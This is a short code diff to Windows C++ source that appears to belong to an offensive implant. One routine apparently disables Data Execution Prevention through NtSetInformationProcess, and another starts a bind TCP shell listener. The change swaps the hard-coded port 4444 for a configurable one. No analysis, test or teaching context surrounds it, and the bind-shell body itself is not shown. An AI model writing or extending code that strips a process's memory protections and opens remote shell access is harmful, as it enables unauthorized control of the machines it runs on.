@@ -1,10 +1,13 @@
 #include <Windows.h>
 #include <iostream>
 #include "common.h"
+#include "structs.h"
 
 void start_bindtcp(int port);
 
 typedef NTSTATUS(WINAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
+
+CONFIG conf;
 
 BOOL disable_dep() {
     HMODULE ntdll_handle;
@@ -24,7 +27,11 @@ BOOL disable_dep() {
 }
 
 void start_executable() {
+    if (conf.port == NULL)
+    {
+        return;
+    }
     disable_dep();
-    start_bindtcp(4444);
+    start_bindtcp(conf.port);
 
 }
